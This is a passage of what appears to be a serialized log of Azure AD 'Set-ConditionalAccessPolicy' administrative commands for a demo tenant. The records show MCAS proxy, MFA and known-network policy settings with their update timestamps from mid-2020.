'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/29/2020 5:15:37 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/29/2020 5:15:37 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/29/2020 5:15:40 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '7/29/2020 5:15:40 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/30/2020 2:16:46 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/30/2020 2:16:46 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/30/2020 5:13:58 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/30/2020 5:13:58 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/31/2020 2:40:02 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/31/2020 2:40:02 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/31/2020 2:40:03 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/31/2020 2:40:04 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/31/2020 4:58:18 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/31/2020 4:58:17 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/1/2020 2:29:49 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/1/2020 2:29:49 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/1/2020 5:29:05 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/1/2020 5:29:05 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/1/2020 5:29:08 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/1/2020 5:29:08 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/2/2020 2:12:56 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/2/2020 2:12:56 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/2/2020 5:26:58 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/2/2020 5:27:00 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/3/2020 2:09:01 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/3/2020 2:09:01 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': 